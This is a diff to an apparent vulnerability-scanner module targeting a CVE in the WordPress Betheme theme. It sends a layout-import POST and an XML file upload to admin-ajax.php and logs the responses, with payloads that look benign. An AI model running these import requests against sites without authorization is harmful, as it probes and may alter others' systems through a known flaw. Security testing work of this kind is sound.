@@ -59,18 +59,18 @@ class CVE20266261Betheme(WordPressModule):
         *,
         timeout: float,
     ) -> dict:
+        """Muffin builder import: JSON layout POST then optional XML upload (verify against Betheme SA)."""
         ajax = self._path(target, "/wp-admin/admin-ajax.php")
         out: dict = {"admin_ajax_posts": []}
         try:
-            dump = (
-                '{"type": "section", "wrap": "1", "items": []}'
-            )
+            layout_json = '{"type":"section","items":[{"type":"wrap","items":[]}]}'
             fields = {
                 "action": "betheme_layout_import",
-                "mfn-builder-import": dump,
+                "mfn-builder-import": layout_json,
+                "overwrite": "1",
             }
             body = urlencode(fields).encode("utf-8")
-            r = await client.request(
+            r1 = await client.request(
                 "POST",
                 ajax,
                 headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -81,8 +81,20 @@ class CVE20266261Betheme(WordPressModule):
                 {
                     "path": ajax,
                     "action": "betheme_layout_import",
-                    "status_code": r.status_code,
-                    "body_snippet": (r.text or "")[:2000],
+                    "status_code": r1.status_code,
+                    "body_snippet": (r1.text or "")[:1500],
+                }
+            )
+            xml_blob = b'<?xml version="1.0"?><mfn:borderless layout="audit"/>'
+            files = {"import_file": ("cpointed-layout.xml", xml_blob, "text/xml")}
+            data2 = {"action": "mfn_builder_import_file", "type": "layouts"}
+            r2 = await client.request("POST", ajax, data=data2, files=files, timeout=timeout)
+            out["admin_ajax_posts"].append(
+                {
+                    "path": ajax,
+                    "action": "mfn_builder_import_file",
+                    "status_code": r2.status_code,
+                    "body_snippet": (r2.text or "")[:1500],
                 }
             )
         except Exception as exc:  # pragma: no cover - network
